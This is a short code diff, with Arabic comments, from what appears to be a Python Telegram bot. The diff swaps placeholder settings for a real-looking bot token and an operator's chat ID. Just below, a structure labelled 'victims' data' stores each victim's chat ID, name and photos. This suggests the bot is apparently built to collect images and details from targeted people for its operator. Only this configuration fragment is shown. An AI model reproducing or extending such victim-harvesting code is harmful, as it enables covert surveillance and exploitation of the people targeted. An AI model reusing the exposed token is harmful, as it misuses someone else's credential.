@@ -7,8 +7,8 @@ import asyncio
 
 # ============= إعدادات البوت =============
 # ضع التوكن و Chat ID هنا
-TOKEN = "ضع_التوكن_هنا"
-ADMIN_CHAT_ID = 123456789  # ضع Chat ID الخاص بك هنا
+TOKEN = "8794579481:AAGNquogxF_5Gi-gGfDJHOusrJan8rPHkfw"
+ADMIN_CHAT_ID = 1033014201  # ضع Chat ID الخاص بك هنا
 
 # تخزين بيانات الضحايا
 victims = {}  # {victim_id: {"chat_id": chat_id, "name": name, "photos": []}}
